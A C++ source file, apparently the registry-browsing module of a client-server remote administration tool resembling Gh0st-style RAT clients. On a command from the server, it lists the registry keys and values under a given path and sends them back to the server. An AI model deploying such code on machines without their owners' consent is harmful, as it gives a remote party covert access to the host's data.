#include "ClientRegisterManager.h"
#include "Common.h"


CClientRegisterManager::CClientRegisterManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	BYTE IsToken = CLIENT_REGISTER_MANAGER_REPLY;
	m_ClientObject->OnServerSending((char*)&IsToken, 1);
}


CClientRegisterManager::~CClientRegisterManager()
{
	printf("~CClientRegisterManager()\r\n");
}
void CClientRegisterManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_REGISTER_MANAGER_DATA_CONTINUE:             //查数据
		if (BufferLength > 3)
		{
			FindRegisterData(BufferData[1], (char*)(BufferData + 2));
		}
		else {
			FindRegisterData(BufferData[1], NULL);   //Root数据
		}
		break;
	default:
		break;
	}
}

VOID CClientRegisterManager::FindRegisterData(char IsToken, char* KeyPath)
{

	CRegister  Register(IsToken);
	if (KeyPath != NULL)
	{
		Register.SetPath(KeyPath);
	}
	char* BufferData = Register.FindPath();
	if (BufferData != NULL)
	{
		m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
		//目录下的目录
		LocalFree(BufferData);
	}
	BufferData = Register.FindKey();
	if (BufferData != NULL) {


		//目录下的文件
		m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
		LocalFree(BufferData);
	}
}
